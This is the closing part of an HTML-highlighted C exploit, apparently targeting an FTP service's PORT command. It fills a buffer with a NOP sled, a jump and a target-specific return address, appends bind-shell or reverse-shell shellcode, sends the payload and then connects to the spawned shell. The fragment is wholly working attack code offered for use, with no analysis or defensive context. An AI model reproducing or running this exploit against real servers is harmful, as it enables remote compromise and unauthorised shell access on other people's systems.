</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">+</span><span class="sc4">0000</span><span class="sc10">,</span><span class="sc4">0x90</span><span class="sc10">,</span><span class="sc4">2000</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strncpy</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"PORT "</span><span class="sc10">,</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">"\x0a"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">+</span><span class="sc4">272</span><span class="sc10">,</span><span class="sc11">jmp</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">+</span><span class="sc4">276</span><span class="sc10">,&amp;</span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">type</span><span class="sc10">].</span><span class="sc11">goreg</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">+</span><span class="sc4">280</span><span class="sc10">,</span><span class="sc11">jmp</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc4">5</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">setoff</span><span class="sc10">(</span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">type</span><span class="sc10">].</span><span class="sc11">gpa</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">targets</span><span class="sc10">[</span><span class="sc11">type</span><span class="sc10">].</span><span class="sc11">lla</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bindopt</span><span class="sc10">)</span><span class="sc0">
 </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">+</span><span class="sc4">300</span><span class="sc10">,&amp;</span><span class="sc11">bsh</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">bsh</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0">
 </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">+</span><span class="sc4">300</span><span class="sc10">,&amp;</span><span class="sc11">rsh</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">rsh</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">// --------------------  end of core
</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bindopt</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc11">sin</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">Port</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">sleep</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">6</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">sin</span><span class="sc10">,</span><span class="sc4">16</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"[-] exploit most likely failed"</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">shell</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">wait</span><span class="sc10">(&amp;</span><span class="sc11">pid</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
